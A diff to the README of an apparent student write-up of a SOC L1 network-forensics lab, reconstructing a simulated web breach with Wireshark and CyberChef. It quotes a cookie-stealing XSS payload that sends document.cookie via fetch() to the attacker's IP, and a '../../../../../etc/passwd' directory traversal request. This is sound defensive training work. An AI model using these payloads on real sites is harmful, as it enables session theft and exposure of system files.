@@ -1,4 +1,4 @@
-# 🛡️ CyberLabs SOC L1 – RetailBreach Investigation
+# CyberLabs SOC L1 – RetailBreach Investigation
 
 <p align="center">
   <img src="https://img.shields.io/badge/Wireshark-Network%20Analysis-1679A7?style=for-the-badge&logo=wireshark&logoColor=white">
@@ -8,75 +8,79 @@
 
 ## Table of Contents
 
-- [Overview](#overview)
-- [What I Was Trying to Find](#what-i-was-trying-to-find)
-- [Tools I Used](#tools-i-used)
-- [Skills I Practiced](#skills-i-practiced)
-- [Walking Through the Investigation](#walking-through-the-investigation)
-  - [Task 1 – Finding the Attacker's IP](#task-1--finding-the-attackers-ip)
-  - [Task 2 – What Tool Was Used for the Brute Force](#task-2--what-tool-was-used-for-the-brute-force)
-  - [Task 3 – Finding the XSS Payload](#task-3--finding-the-xss-payload)
-  - [Task 4 – When Did the Admin First Hit the Compromised Page](#task-4--when-did-the-admin-first-hit-the-compromised-page)
-  - [Task 5 – Finding the Stolen Session Token](#task-5--finding-the-stolen-session-token)
-  - [Task 6 – Which Script Got Exploited](#task-6--which-script-got-exploited)
-  - [Task 7 – The Payload Used to Reach a Sensitive File](#task-7--the-payload-used-to-reach-a-sensitive-file)
-- [Incident Timeline](#incident-timeline)
-- [Key Findings](#key-findings)
-- [How It All Fits Together](#how-it-all-fits-together)
-- [What I Took Away From This](#what-i-took-away-from-this)
-- [Repository Structure](#project-structure)
+* [Overview](#overview)
+* [What I Was Trying to Find](#what-i-was-trying-to-find)
+* [Tools I Used](#tools-i-used)
+* [Skills I Practiced](#skills-i-practiced)
+* [Walking Through the Investigation](#walking-through-the-investigation)
+
+  * [Task 1 – Finding the Attacker's IP](#task-1--finding-the-attackers-ip)
+  * [Task 2 – What Tool Was Used for the Brute Force](#task-2--what-tool-was-used-for-the-brute-force)
+  * [Task 3 – Finding the XSS Payload](#task-3--finding-the-xss-payload)
+  * [Task 4 – When Did the Admin First Hit the Compromised Page](#task-4--when-did-the-admin-first-hit-the-compromised-page)
+  * [Task 5 – Finding the Stolen Session Token](#task-5--finding-the-stolen-session-token)
+  * [Task 6 – Which Script Got Exploited](#task-6--which-script-got-exploited)
+  * [Task 7 – The Payload Used to Reach a Sensitive File](#task-7--the-payload-used-to-reach-a-sensitive-file)
+* [Incident Timeline](#incident-timeline)
+* [Key Findings](#key-findings)
+* [How It All Fits Together](#how-it-all-fits-together)
+* [What I Took Away From This](#what-i-took-away-from-this)
+* [Repository Structure](#repository-structure)
+* [Connect](#connect)
+
+---
 
 ## Overview
 
-This is my write-up of the **RetailBreach** lab on **CyberLabs**, one of the L1 SOC investigation labs I worked through as part of my cybersecurity journey.
+This is my write-up of the **RetailBreach** lab on **CyberLabs**, one of the L1 SOC investigation labs I completed as part of my cybersecurity learning journey.
 
-The scenario: a simulated web app got compromised, and I had to dig through the network traffic to figure out what actually happened — who the attacker was, how they got in, what they stole, and what they tried to do with it. Basically playing SOC analyst for an afternoon.
+The scenario involved a simulated web application compromise. I investigated the available network traffic to determine what happened, identify the attacker, understand how the application was compromised, and trace the actions that followed.
 
-I used Wireshark to go through the packet captures and CyberChef to decode a couple of payloads along the way.
+I used **Wireshark** for network traffic analysis and **CyberChef** to decode URL-encoded payloads during the investigation.
 
 **Platform:** CyberLabs
 
 **Lab:** RetailBreach
 
-**Role I was playing:** SOC Analyst L1
+**Goal:** Investigate the incident from a SOC analyst perspective and reconstruct the attack chain using the available network traffic.
 
-> **Note:** This was done in a controlled training environment. I've redacted the actual session token from this repo — even in a lab, it's still an authentication credential and I'd rather build the habit of not publishing that stuff.
+> **Note:** This investigation was completed in a controlled training environment. The actual session token has been redacted from this repository. Even in a lab environment, session tokens are authentication credentials, so I am treating them as sensitive information.
 
 ---
 
 ## What I Was Trying to Find
 
 * The attacker's IP address
-* What tool they used to brute-force / enumerate the site
-* The XSS payload they injected
-* When the admin actually opened the compromised page
-* The session token that got stolen
-* Which script on the app got exploited
-* The exact payload used to try and grab a sensitive system file
+* The tool used to enumerate the website
+* The XSS payload that was injected
+* When the administrator first accessed the compromised page
+* The stolen session token
+* The vulnerable script that was exploited
+* The exact directory traversal payload used to access a sensitive system file
 
 ---
 
 ## Tools I Used
 
-| Tool          | Purpose                                |
-| ------------- | -------------------------------------- |
-| **Wireshark** | for the actual packet/traffic analysis |
-| **CyberChef** | for decoding URL-encoded payloads      |
+| Tool          | Purpose                             |
+| ------------- | ----------------------------------- |
+| **Wireshark** | Network traffic and packet analysis |
+| **CyberChef** | Decoding URL-encoded payloads       |
 
-### Skills I Practiced
+## Skills I Practiced
 
-| Skill                                                     | Status |
-| --------------------------------------------------------- | :----: |
-| Reading network traffic and following conversations       |    ✅   |
-| Analysing HTTP requests                                   |    ✅   |
-| Following HTTP streams                                    |    ✅   |
-| Reading User-Agent strings                                |    ✅   |
-| Investigating XSS                                         |    ✅   |
-| URL decoding                                              |    ✅   |
-| Building a timeline from timestamps                       |    ✅   |
-| Session/cookie analysis                                   |    ✅   |
-| General "how did this attack actually work" investigation |    ✅   |
-| Spotting directory traversal                              |    ✅   |
+| Skill                                               | Status |
+| --------------------------------------------------- | :----: |
+| Reading network traffic and following conversations |    ✅   |
+| Analysing HTTP requests                             |    ✅   |
+| Following HTTP streams                              |    ✅   |
+| Reading User-Agent strings                          |    ✅   |
+| Investigating XSS                                   |    ✅   |
+| URL decoding                                        |    ✅   |
+| Building a timeline from timestamps                 |    ✅   |
+| Session and cookie analysis                         |    ✅   |
+| Investigating web attack activity                   |    ✅   |
+| Identifying directory traversal                     |    ✅   |
 
 ---
 
@@ -84,9 +88,11 @@ I used Wireshark to go through the packet captures and CyberChef to decode a cou
 
 ## Task 1 – Finding the Attacker's IP
 
-**What I was looking for:** which IP was actually behind the suspicious activity.
+**What I was looking for:** Which IP address was responsible for the suspicious activity?
 
-I went to **Statistics → Conversations** in Wireshark to see who was talking to who. One IP was clearly sending way more traffic than it was receiving back — that's usually a decent sign something's off, so I flagged it as the one to dig into.
+I went to **Statistics → Conversations** in Wireshark to examine the communication between hosts.
+
+One IP address was generating significantly more traffic than it was receiving, making it a good candidate for further investigation.
 
 **Finding:** `111.224.180.128`
 
@@ -98,27 +104,27 @@ I went to **Statistics → Conversations** in Wireshark to see who was talking t
 
 **Figure 2: Network conversation details supporting the attacker IP finding.**
 
-**Takeaway:** Traffic volume and direction alone can point you toward who's worth investigating first, before you even look at what's inside the packets.
+**Takeaway:** Traffic volume and direction can help identify suspicious hosts before examining the contents of individual packets.
 
 ---
 
 ## Task 2 – What Tool Was Used for the Brute Force
 
-**What I was looking for:** how the attacker was hammering the site.
+**What I was looking for:** How was the attacker enumerating the website?
 
-I filtered everything down to just the attacker's traffic:
+I filtered the traffic to show activity originating from the suspected attacker:
 
 ```text
 ip.src == 111.224.180.128
 ```
 
-That turned up a weird request:
+This revealed a suspicious request:
 
 ```http
 GET /.cvsignore HTTP/1.1
 ```
 
-Followed the HTTP stream and checked the User-Agent header, which basically gave it away.
+I followed the HTTP stream and examined the User-Agent header.
 
 **Finding:** `Gobuster`
 
@@ -130,21 +136,21 @@ Followed the HTTP stream and checked the User-Agent header, which basically gave
 
 **Figure 4: User-Agent information identifying Gobuster.**
 
-**Takeaway:** A lot of scanning/enumeration tools don't hide themselves — the User-Agent header will often just tell you what's running against you.
+**Takeaway:** Enumeration tools may identify themselves through their User-Agent strings, making them useful indicators during network investigations.
 
 ---
 
 ## Task 3 – Finding the XSS Payload
 
-**What I was looking for:** the actual malicious script the attacker injected.
+**What I was looking for:** The malicious script injected by the attacker.
 
-Filtered for traffic from the attacker that mentioned "script":
+I filtered for traffic from the suspected attacker containing the word `script`:
 
 ```text
 ip.src == 111.224.180.128 && http contains "script"
 ```
 
-That led me to a POST request to `reviews.php`. I followed the stream and the payload was URL-encoded, so I ran it through CyberChef to decode it.
+This led to a POST request involving `reviews.php`. I followed the HTTP stream and found that the payload was URL-encoded, so I used CyberChef to decode it.
 
 **What I found:**
 
@@ -152,7 +158,7 @@ That led me to a POST request to `reviews.php`. I followed the stream and the pa
 <script>fetch('http://111.224.180.128/' + document.cookie);</script>
 ```
 
-Pretty classic cookie-stealing XSS — grab `document.cookie` and send it straight to the attacker's own IP.
+The payload attempts to access `document.cookie` and send the result to the attacker's IP address.
 
 ![Task 3 - XSS Payload](screenshots/Task-03-XSS-payload-01.png)
 
@@ -162,97 +168,105 @@ Pretty classic cookie-stealing XSS — grab `document.cookie` and send it straig
 
 **Figure 6: Decoded XSS payload showing `document.cookie` being sent to the attacker's IP.**
 
-**Takeaway:** This was my first time really connecting "XSS" as a concept to what it looks like in raw traffic. Seeing `document.cookie` getting exfiltrated made session hijacking click for me in a way just reading about it never did.
+**Takeaway:** This investigation helped me connect XSS theory to what malicious activity actually looks like in network traffic. Seeing `document.cookie` being accessed and transmitted made the connection between XSS and session theft much clearer.
 
 ---
 
 ## Task 4 – When Did the Admin First Hit the Compromised Page
 
-**What I was looking for:** the UTC timestamp of the admin's first visit after the page was compromised.
+**What I was looking for:** The UTC timestamp of the administrator's first visit after the page had been compromised.
 
-From Task 3, the XSS was injected at roughly **12:08 UTC**. So I filtered for requests to `reviews.php` that weren't from the attacker:
+From Task 3, the XSS payload was injected at approximately **12:08 UTC**.
+
+I then filtered for requests to `reviews.php` that did not originate from the attacker:
 
 ```text
 ip.src != 111.224.180.128 && http.request.uri contains "reviews.php"
 ```
 
-Two requests showed up — one at 11:50 UTC and one at 12:09 UTC. Since 11:50 was *before* the payload even existed, that visit couldn't have hit the malicious script. So 12:09 had to be the real one.
+Two requests appeared: one at **11:50 UTC** and another at **12:09 UTC**.
+
+The 11:50 request occurred before the XSS payload was injected, so it could not have triggered the malicious script.
+
+The 12:09 request occurred after the injection and was therefore the relevant administrator visit.
 
 **Finding:** `2024-03-29 12:09 UTC`
 
 ![Task 4 - Admin First Timestamp](screenshots/Task-04-Admin-First-Visit-Timestamp.png)
 
-**Figure 7: Admin request showing the first visit to the compromised page at 12:09 UTC.**
+**Figure 7: Administrator request showing the first visit to the compromised page at 12:09 UTC.**
 
 ![Task 4 - XSS Timestamp](screenshots/Task-04-XSS-Injection-Timestamp.png)
 
 **Figure 8: Timestamp showing when the XSS payload was injected.**
 
-**Takeaway:** Timestamps only mean something once you line them up against each other. This was a good reminder to always double-check that a "hit" actually happened *after* the thing that would've caused it.
+**Takeaway:** A timestamp becomes meaningful when it is correlated with other events. Comparing the XSS injection time with the administrator's requests helped establish the correct sequence of events.
 
 ---
 
 ## Task 5 – Finding the Stolen Session Token
 
-**What I was looking for:** the session token that got exposed through the XSS.
+**What I was looking for:** The session token exposed through the XSS attack.
 
-Went back to the packet from Task 4 and followed that HTTP stream, then checked the headers for cookies. Found a `PHPSESSID` value sitting right there.
+I returned to the packet associated with the administrator's visit and followed the HTTP stream. I then examined the headers and found a `PHPSESSID` value.
 
 **Finding:** `[REDACTED – LAB SESSION TOKEN]`
 
-I'm not publishing the real value here — it's still a credential, even in a training lab, and I want to get in the habit of treating it that way.
+The actual token is not included in this repository because it is an authentication credential, even though it originated from a training environment.
 
 ![Task 5 - Stolen Session Token](screenshots/Task-05-Stolen-Session-Token.png)
 
 **Figure 9: HTTP stream showing the stolen session token, with the sensitive value redacted.**
 
-**Takeaway:** This was the moment where Task 3 and Task 4 actually connected — the XSS I found earlier was the exact mechanism that leaked this token.
+**Takeaway:** This connected the earlier XSS finding to the subsequent session activity. The injected JavaScript provided a mechanism for exposing the administrator's session information.
 
 ---
 
 ## Task 6 – Which Script Got Exploited
 
-**What I was looking for:** what the attacker actually did once they had the stolen session.
+**What I was looking for:** What the attacker did after obtaining the stolen session.
 
-Used the session token to filter the attacker's traffic:
+I used the compromised session information to filter the attacker's traffic:
 
 ```text
 ip.src == 111.224.180.128 && http && frame contains "<LAB_SESSION_TOKEN>"
 ```
 
-That turned up requests to an admin script:
+This revealed requests to an administrative script:
 
 ```text
 /admin/log_viewer.php?file=error.log
 ```
 
-and then:
+The attacker then attempted:
 
 ```text
 /admin/log_viewer.php?file=../../../../../etc/passwd
 ```
 
-So the `file` parameter on `log_viewer.php` was clearly the thing being messed with.
+This showed that the `file` parameter of `log_viewer.php` was being abused.
 
 **Finding:** `log_viewer.php`
 
 ![Task 6 - Exploited Script](screenshots/Task-06-Exploited-Script-Log-Viewer-01.png)
 
-**Figure 10: Request to the vulnerable `log_viewer.php` admin script.**
+**Figure 10: Request to the vulnerable `log_viewer.php` administrative script.**
 
 ![Task 6 - Exploited Script - Directory Traversal](screenshots/Task-06-Exploited-Script-Log-Viewer-02.png)
 
 **Figure 11: Request showing the directory traversal attempt against the `file` parameter.**
 
-**Takeaway:** Once you have a stolen session, you can literally filter traffic by it and watch what the attacker did step by step — it turns the rest of the investigation into following a trail.
+**Takeaway:** Once the compromised session was identified, filtering the traffic by that session made it possible to trace the attacker's subsequent actions step by step.
 
 ---
 
 ## Task 7 – The Payload Used to Reach a Sensitive File
 
-**What I was looking for:** the exact string used to try and pull a system file.
+**What I was looking for:** The exact payload used to attempt access to a sensitive system file.
 
-Kept looking at traffic tied to the compromised session and the vulnerable script from Task 6:
+I continued examining traffic associated with the compromised session and the vulnerable script identified in Task 6.
+
+The relevant request was:
 
 ```http
 GET /admin/log_viewer.php?file=../../../../../etc/passwd HTTP/1.1
@@ -264,52 +278,58 @@ GET /admin/log_viewer.php?file=../../../../../etc/passwd HTTP/1.1
 ../../../../../etc/passwd
 ```
 
-Classic directory traversal — stacking `../` to climb out of the app's directory and reach `/etc/passwd`.
+This is a directory traversal payload using repeated `../` sequences to move outside the application's intended directory and attempt to access `/etc/passwd`.
 
 ![Task 7 - Directory Traversal Payload](screenshots/Task-07-Directory-Traversal-Payload.png)
 
 **Figure 12: Directory traversal payload targeting `/etc/passwd`.**
 
-**Takeaway:** The vulnerable script and the payload are two separate findings — knowing *where* the flaw is doesn't automatically tell you *how* it was abused.
+**Takeaway:** Identifying the vulnerable script and identifying the payload used to exploit it are two separate parts of the investigation.
 
 ---
 
 # Incident Timeline
 
-| Time            | What Happened                                                                 |
-| --------------- | ----------------------------------------------------------------------------- |
-| 11:50 UTC       | Legit visit to `reviews.php`, before anything was injected                    |
-| 12:08 UTC       | Attacker injects the XSS payload                                              |
-| 12:09 UTC       | Admin opens the now-compromised page                                          |
-| After 12:09 UTC | Stolen session gets used for further attacker activity                        |
-| Later           | Attacker hits `log_viewer.php`, attempts directory traversal to `/etc/passwd` |
+| Time                | What Happened                                                                            |
+| ------------------- | ---------------------------------------------------------------------------------------- |
+| **11:50 UTC**       | Legitimate visit to `reviews.php`, before the XSS payload was injected                   |
+| **12:08 UTC**       | Attacker injects the XSS payload                                                         |
+| **12:09 UTC**       | Administrator opens the compromised page                                                 |
+| **After 12:09 UTC** | Stolen session is used for further attacker activity                                     |
+| **Later**           | Attacker accesses `log_viewer.php` and attempts directory traversal toward `/etc/passwd` |
 
 ---
 
 # Key Findings
 
-| What I Was Looking For                  | What I Found                        |
-| --------------------------------------- | ----------------------------------- |
-| Attacker IP                             | `111.224.180.128`                   |
-| Enumeration tool                        | `Gobuster`                          |
-| XSS payload                             | `fetch()` sending `document.cookie` |
-| Admin's first visit to compromised page | `2024-03-29 12:09 UTC`              |
-| Session token                           | Redacted                            |
-| Exploited script                        | `log_viewer.php`                    |
-| Target file                             | `/etc/passwd`                       |
-| Directory traversal payload             | `../../../../../etc/passwd`         |
+| What I Was Looking For                          | What I Found                        |
+| ----------------------------------------------- | ----------------------------------- |
+| Attacker IP                                     | `111.224.180.128`                   |
+| Enumeration tool                                | `Gobuster`                          |
+| XSS payload                                     | `fetch()` sending `document.cookie` |
+| Administrator's first visit to compromised page | `2024-03-29 12:09 UTC`              |
+| Session token                                   | Redacted                            |
+| Exploited script                                | `log_viewer.php`                    |
+| Target file                                     | `/etc/passwd`                       |
+| Directory traversal payload                     | `../../../../../etc/passwd`         |
 
 ---
 
 # How It All Fits Together
 
-Piecing it together, here's roughly how the attack went down:
+Piecing the evidence together, the attack followed a clear sequence.
 
-The attacker (`111.224.180.128`) started by running Gobuster against the site to enumerate hidden files and directories. At some point they found a way to inject an XSS payload into `reviews.php`, using `fetch()` to send whatever cookie the victim had straight back to their own IP.
+The attacker (`111.224.180.128`) began by using **Gobuster** to enumerate the web application. They then injected an XSS payload into `reviews.php` that attempted to send the victim's `document.cookie` to the attacker's IP address.
 
-When the admin opened that page at 12:09 UTC, the script fired and their `PHPSESSID` got exfiltrated. From there, the attacker used that stolen session to reach `log_viewer.php`, an admin-only script, and tried a directory traversal payload against its `file` parameter to get at `/etc/passwd`.
+When the administrator opened the compromised page at **12:09 UTC**, the malicious script executed and exposed the administrator's `PHPSESSID`.
 
-So it's really a three-stage chain: **enumeration → XSS/session theft → privilege abuse via the stolen session.** That's the kind of chain I want to get faster at spotting.
+The attacker then used the compromised session to access the administrative `log_viewer.php` script. Finally, they attempted to abuse its `file` parameter using a directory traversal payload targeting `/etc/passwd`.
+
+The overall attack chain can therefore be summarized as:
+
+**Enumeration → XSS → Session Theft → Authenticated Access → Directory Traversal**
+
+This was the main part of the investigation I wanted to understand: not just identifying individual indicators, but connecting them together to reconstruct the full attack sequence.
 
 ---
 
@@ -317,27 +337,31 @@ So it's really a three-stage chain: **enumeration → XSS/session theft → priv
 
 * Wireshark packet analysis
 * Traffic conversation analysis
-* HTTP request/stream analysis
+* HTTP request and stream analysis
 * User-Agent identification
 * XSS analysis
-* URL decoding (CyberChef)
+* URL decoding with CyberChef
 * Timeline reconstruction
-* Session/cookie analysis
+* Session and cookie analysis
 * Web attack investigation
 * Directory traversal analysis
-* Writing up an incident afterward
+* Incident documentation
 
 ---
 
 # What I Took Away From This
 
-This lab helped me get more comfortable actually using Wireshark on something that felt close to a real incident, instead of just following a tutorial.
+This lab helped me become more comfortable using Wireshark to investigate an incident rather than simply following a tutorial.
 
-Biggest lesson: individual packets are useful, but the real work is connecting them into a story — this IP did this, which led to that, which explains why this other thing happened later. That's the part that actually feels like SOC analyst work, not just "find the flag."
+The biggest lesson for me was that individual packets are useful, but the real value comes from connecting them into a timeline:
 
-It also made the connection between XSS and session hijacking way more concrete for me — I'd read about it before, but watching a cookie actually walk out the door via `fetch()` and then get reused against an admin script made it click properly.
+**This IP did this → which led to that → which explains what happened next.**
 
-Next thing I want to try: a lab where I have to build the detection rule/alert myself instead of just investigating after the fact.
+That is the part of network investigation that feels most relevant to SOC analyst work.
+
+The lab also made the connection between XSS and session hijacking much more concrete. I had read about the concepts before, but seeing a cookie being accessed through `document.cookie` and then connecting that activity to the later use of the session made the attack chain much easier to understand.
+
+My next goal is to work on a lab where I have to build the detection rule or alert myself instead of only investigating the incident after it has occurred.
 
 ---
 
@@ -349,6 +373,7 @@ CyberLabs-SOC-L1-RetailBreach/
 ├── README.md
 │
 └── screenshots/
+    │
     ├── Task-01-attacker-ip-01.png
     ├── Task-01-attacker-ip-02.png
     │
@@ -358,8 +383,8 @@ CyberLabs-SOC-L1-RetailBreach/
     ├── Task-03-XSS-payload-01.png
     ├── Task-03-XSS-payload-02.png
     │
-    ├── Admin-First-Timestamp.png
-    ├── XSS-Timestamp.png
+    ├── Task-04-Admin-First-Visit-Timestamp.png
+    ├── Task-04-XSS-Injection-Timestamp.png
     │
     ├── Task-05-Stolen-Session-Token.png
     │
@@ -369,12 +394,20 @@ CyberLabs-SOC-L1-RetailBreach/
     └── Task-07-Directory-Traversal-Payload.png
 ```
 
-## 🤝 Connect
+---
+
+# Disclaimer
+
+This project was completed in a controlled CyberLabs training environment for educational purposes.
+
+All sensitive authentication information, including the session token, has been redacted before publishing.
+
+---
+
+# Connect
 
 Thank you for taking the time to view this project.
 
-I'm documenting my cybersecurity learning journey by completing hands-on labs in networking, Linux, digital forensics, cloud computing, and SOC analysis. Feel free to explore my other repositories to see what I'm learning next.
+I'm documenting my cybersecurity learning journey through hands-on labs covering networking, Linux, digital forensics, cloud computing, and SOC analysis.
 
-
-
-
+Feel free to explore my other repositories to see what I'm learning next.
